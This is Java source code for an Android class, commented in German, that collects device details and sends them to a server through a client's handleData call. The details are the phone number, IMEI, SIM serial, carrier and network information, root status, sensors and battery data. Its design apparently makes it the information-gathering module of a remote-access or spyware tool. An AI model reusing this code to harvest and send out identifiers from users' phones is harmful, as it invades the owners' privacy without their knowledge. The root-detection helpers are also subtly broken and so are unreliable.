package my.app.Library;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.hardware.Sensor;
import android.hardware.SensorManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.BatteryManager;
import android.telephony.TelephonyManager;
import my.app.client.ClientListener;
import Packet.AdvancedInformationPacket;

/**
 * Diese Klasse sammelt Systeminformationen �ber das Ger�t.
 * Dazugeh�ren Informationen �ber das Ger�t, Informationen �ber das Netzwerk in welchem sich das Ger�t befindet,
 * Informationen �ber die Androidversion, welche auf dem Ger�t installiert ist und schlie�lich noch Informationen �ber die im Ger�t verbauten Sensoren.
 */
public class AdvancedSystemInfo {
	/**
	 * Die Klasse hat verschiedene Varibalen:
	 * waitinBattery wird nie benutzt
	 * ctx Ein ClientListener in wlechem der Client gepseichert wird.
	 * channel wird f�r die Methode handleData ben�tigt.
	 * p ist die Struktur in welcher alle Informationen �ber das Ger�t gespeichert werden.
	 */
	boolean waitingBattery = true;
	ClientListener ctx;
	int channel;
	AdvancedInformationPacket p;
	/**
	 * Der Konstruktor weist die entspechenden Daten den Klassenvaribalen zu. Au�erdem erstellt er ein neues AdvancedInformationPacket Objekt.
	 * @param c Der Client, welcher die Klasse aufruft und das Objekt erstellt.
	 * @param channel Der Kanal f�r handleData.
	 */
	public AdvancedSystemInfo(ClientListener c, int channel) {
		p = new AdvancedInformationPacket();
		ctx = c;
		this.channel = channel;
	}

	/**
	 * Die wichtigste Methode der Klasse. Hier werden alle anderen Methoden aufgerufen.
	 */
	public void getInfos() {
	
		phoneInfo();
		networkInfo();
		androidInfo();
		sensorsInfo();
		rooted();
		/**
		 * Diese Zeile sorgt daf�r, dass ein Intent mit den Batterie Informationen gesendet wird und dieser von dem
		 * Broadcast Receiver weiter unten in der Klasse empfangen werden kann.
		 */
		ctx.registerReceiver(this.batteryInfoReceiver,	new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
		/*while(waitingBattery) {
			try {
				Thread.sleep(10);
			} catch(Exception e) {}
		}*/
		
		//ctx.handleData(channel, p.build());
	}

	/**
	 * Die Methode holt verschiedene Informationen der Telefons und speichert diese in der Varibalen p.
	 * Bei den Informationen handelt es sich um die Telefonnummer des Handy, die IMEI, die Software Version,
	 * die L�nderkennung, den Anbieter Code, den Namen des Anbieters, den Simkatenanbierter Code, den Simkatenanbieternamen,
	 * den L�ndercode der Simkarte und die Serinenummerder Simkarte.
	 * Die methode getSystemService(Context.TELEPHONY_SERVICE) liefert einen Telephonmanger, der die Telefonfeatures des Ger�ts verwaltet.
	 * Aus diesem TelephonyManager k�nnen dann die unterschiedlichen Informationen ausgelesen werden.
	 */
	public void phoneInfo() {
        TelephonyManager tm = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
        p.setPhoneNumber(tm.getLine1Number());
        p.setIMEI(tm.getDeviceId());
        p.setSoftwareVersion(tm.getDeviceSoftwareVersion());
        p.setCountryCode(tm.getNetworkCountryIso());
        p.setOperatorCode(tm.getNetworkOperator());
        p.setOperatorName(tm.getNetworkOperatorName());
        p.setSimOperatorCode(tm.getSimOperator());
        p.setSimOperatorName(tm.getSimOperatorName());
        p.setSimCountryCode(tm.getSimCountryIso());
        p.setSimSerial(tm.getSimSerialNumber());
	}
	/**
	 * Mit dieser Funktion werden verschiedene Informationen �ber die Netzwerke des Ger�tes abgefragt und erfasst.
	 */
	public void networkInfo() {
		/**
		 * Um Informationen �ber die Netzwerke zu erhalten ben�tigt man einen ConnectivityManager.
		 * Um dann genaue Informationen �ber ein bestimmtes Netzwerk zubekommen, muss man auf die Vaiablen des Connectivity Managers zugreifen.
		 */
        ConnectivityManager cm = (ConnectivityManager) ctx.getSystemService(Context.CONNECTIVITY_SERVICE);
		/**
		 * Informationen �ber das WLan werden in der Vaiablen TYPE_WIFI gespeichert.
		 * Um an diese zu gelangen, werden die Daten in der Vaiablen network gespeichert.
		 */
        NetworkInfo network = cm.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
		/**
		 * Nun ist es m�glich p die verschiedenen Daten hinzuzuf�gen.
		 * Zu diesen Daten geh�ren ob das Netzwerk vorhanden ist, ob eine Verbindung besteht und zus�tzliche Informationen wie z.B. die SSID.
		 */
        p.setWifiAvailable(network.isAvailable());
        p.setWifiConnectedOrConnecting(network.isConnectedOrConnecting());
        p.setWifiExtraInfos(network.getExtraInfo());
        p.setWifiReason(network.getReason());
		/**
		 * Hier wird die Variable TYPE_MOBILE abgefragt um Informationen �ber das Mobile Netz zuerhalten.
		 */
        network = cm.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
		/**
		 *Die Informationen werden dann p hinzugef�gt. Beim mobilen Netz handelt es sich um die Geschwindigkeit, die zu Verf�gung steht, ob das Netz vorhanden ist,
		 * ob das Ger�t zu dem Netzwerk verbunden ist und weiter Informationen.
		 */
        if(network != null && (network.getSubtype() == TelephonyManager.NETWORK_TYPE_GPRS || network.getSubtype() == TelephonyManager.NETWORK_TYPE_EDGE)) {
        	p.setMobileNetworkName("2g");
        }
        else
        	p.setMobileNetworkName("3g");
        
        p.setMobileNetworkAvailable(network.isAvailable());
        p.setMobileNetworkConnectedOrConnecting(network.isConnectedOrConnecting());
        p.setMobileNetworkExtraInfos(network.getExtraInfo());
        p.setMobileNetworkReason(network.getReason());
	}

	/**
	 * Mit Hilfe dieser Methode lassen sich Informationen �ber die AndroidVersion auslesen.
	 * Auch diese werden dann in der Variablen p gespeichert.
	 * Bei den Informationen handelt es sich um die Versionsnummer und das vonhandene SDK-Level.
	 */
	public void androidInfo() {
		p.setAndroidVersion(android.os.Build.VERSION.RELEASE);
		p.setAndroidSdk(android.os.Build.VERSION.SDK_INT);
	}

	/**
	 * Diese Funktion besorgt Informationen �ber die verschiedenen Sensoren die in dem Ger�t verbaut sind.
	 */
	public void sensorsInfo() {
		/**
		 * Mit Hilfe eines SensorManager ist es m�glich eine Liste aller Sensoren des Ger�tes zu erhalten.
		 * Diese wird dann in der Liste msensorList gespeichert
		 */
    	SensorManager mSensorManager= (SensorManager) ctx.getSystemService(Context.SENSOR_SERVICE);

        // List of Sensors Available
        List<Sensor> msensorList = mSensorManager.getSensorList(Sensor.TYPE_ALL);
		/**
		 * Die for-Schleife erstellt eine ArrayListe aus Strings und f�gt dieser die Namen der Sensoren hinzu.
		 */
        ArrayList<String> sensors = new ArrayList<String> ();
        for(Sensor s: msensorList) {
        	sensors.add(s.getName());
        }
		/**
		 * Diese Liste wird dann der Vaiablen p hinzugef�gt.
		 */
        p.setSensors(sensors);
	}

	/**
	 * Diese Methode �berpr�ft ob das Ger�t gerootet ist und speichert dies in der Klassenvariable.
	 */
	public void rooted(){
		boolean root = fileExists("/system/app/SuperSU") || fileExists("/system/xbin/_su") ||  fileExists("/system/app/Superuser") || fileExists("/system/app/Superuser.apk") || fileExists("/system/app/SuperSU.apk") ||
				 fileExists("/system/xbin/su")  || commandPossible("/system/xbin/which su") || commandPossible("/system/bin/which su") || commandPossible("which su");
		p.setRooted(root);
	}

	/**
	 * Diese Methode bekommt einen Dateinamen und �berpr�ft, ob die Datei mit diesem Namen existiert.
	 * @param filename	Der Dateiname
	 * @return	true wenn die Datei existiert, false sonst.
	 */
	public boolean fileExists(String filename){
		boolean exists;
		try{
			File file = new File("system/app/" + filename);
			exists = file.exists();
		}catch (Exception e){
			exists = false;
		}
		return exists;
	}

	/**
	 * Diese Methode bekommt einen Befehl �bergeben und �berpr�ft ,ob dieser auf dem Ger�t ausf�hrbar ist.
	 * @param command	Der Befehl
	 * @return	true wenn der Befehl ausf�hrbar ist, false sonst.
	 */
	public boolean commandPossible(String command){
		boolean possible;
		try{
			Runtime.getRuntime().exec(command);
			possible = true;
		}catch(Exception e){
			possible = false;
		}
		return possible;
	}
	/**
	 * Um die Informationen �ber die Batterie zu erhalten muss ein BroadcastReceiver erstellt werden. Dieser ist hier der batteryInfoReceiver.
	 */
    private BroadcastReceiver batteryInfoReceiver = new BroadcastReceiver() {
		@Override
		/**
		 * Diese Funtkion wird aufgerufen wenn ein Intent empfangen wird.
		 * @param context Kontext
		 * @param intent Der empfangen Intent
		 */
		public void onReceive(Context context, Intent intent) {//http://developer.android.com/reference/android/os/BatteryManager.html
			/**
			 * Um nun an die Informationen der Batterie zu gelangen muss nun der im Intent gespeicherte BatteryManager nach den Infromationen durchgegangen werden.
			 * Hierzu werden die Informationen der verschiedenen Variablen des BatteryManager ausgelesen und in Vaiablen zwischen gespeichert.
			 */
			int  health= intent.getIntExtra(BatteryManager.EXTRA_HEALTH,0);
			int  level= intent.getIntExtra(BatteryManager.EXTRA_LEVEL,0);
			int  plugged= intent.getIntExtra(BatteryManager.EXTRA_PLUGGED,0);
			boolean  present= intent.getExtras().getBoolean(BatteryManager.EXTRA_PRESENT);
			int  scale= intent.getIntExtra(BatteryManager.EXTRA_SCALE,0);
			int  status= intent.getIntExtra(BatteryManager.EXTRA_STATUS,0);
			String  technology= intent.getExtras().getString(BatteryManager.EXTRA_TECHNOLOGY);
			int  temperature= intent.getIntExtra(BatteryManager.EXTRA_TEMPERATURE,0);
			int  voltage= intent.getIntExtra(BatteryManager.EXTRA_VOLTAGE,0);
			/**
			 * Danach werden diese Varibalen dem Packet p hinzugef�gt.
			 * Bei den Inforamtionen der Batterie handelt es sich um deren Zustand, das Ladelevel, ob das Ger�t am Kabel ist,
			 * ob die Batterie vorhanden ist, die Gr��e der Batterie, den Status der Batterie, die Technologie der Batterie,
			 * die Temperatur der Batterie und wieviel Volt die Batterie hat.
			 */
			p.setBatteryHealth(health);
			p.setBatteryLevel(level);
			p.setBatteryPlugged(plugged);
			p.setBatteryPresent(present);
			p.setBatteryScale(scale);
			p.setBatteryStatus(status);
			p.setBatteryTechnology(technology);
			p.setBatteryTemperature(temperature);
			p.setBatteryVoltage(voltage);
			/**
			 * Danach wird hier mit Hilfe des Aufrufs der Methode handleData das Packet an den Server gesendet
			 */
			//waitingBattery = false;
			ctx.handleData(channel, p.build());
			
			ctx.unregisterReceiver(batteryInfoReceiver);
		}
	};

}
